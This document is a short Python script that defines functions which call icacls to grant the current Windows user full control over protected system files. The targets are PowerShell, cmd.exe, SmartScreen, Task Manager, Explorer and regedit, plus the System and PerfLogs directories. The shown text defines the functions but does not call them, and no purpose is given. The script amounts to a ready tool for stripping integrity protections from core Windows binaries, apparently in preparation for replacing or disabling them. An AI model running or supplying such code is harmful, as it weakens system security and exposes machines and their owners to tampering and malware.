#!/usr/bin/python
#coding:utf-8
import os, sys, time
# Get the current username
usr = os.environ["USERNAME"]
# Function to get full permission on powershell process windows
def pshll():
    procs = ['powershell.exe', 'powershell_ise.exe']
    for proc in procs:
        ica = "\\windows\\system32\\icacls.exe \\Windows\\System32\\WindowsPowerShell\\v1.0\\%s /grant %s:F " %(proc, usr)
        os.system(ica)
# Function to get full permission on main process windows
def sys32():
    procs = ['cmd.exe', 'smartscreen.exe', 'taskmgr.exe']
    for proc in procs:
        ica = "\\windows\\system32\\icacls.exe \\Windows\\System32\\%s /grant %s:F " %(proc, usr)
        os.system(ica)
# Function to get full permission on Explorer of Windows
def exp():
    ice = "\\Windows\\system32\\icacls.exe \\Windows\\explorer.exe /grant %s:F" %(usr)
    os.system(ice)
# Function to get full permission on Register Windows
def reg():
    icr = "\\Windows\\system32\\icacls.exe \\Windows\\regedit.exe /grant %s:F" %(usr)
    os.system(icr)
# Function to get full permission on PerfLogs directory
def perf():
    icp = "\\windows\\system32\\icacls.exe \Perflogs /grant %s:F" %(usr)
    os.system(icp)
# Function to get full permission on PerfLogs directory and more
def perfall():
    icp1 = "\\windows\\system32\\icacls.exe \Perflogs\* /grant %s:F" %(usr)
    os.system(icp1)
    icpp = "\\windows\\system32\\icacls.exe \Perflogs\gui_counter\* /grant %s:F" %(usr)
    os.system(icpp)
# Function to get full permission on System directory Windows
def sysDir():
    ic = "\\Windows\\system32\\icacls.exe \\Windows\\System /grant %s:F" %(usr)
    os.system(ic)
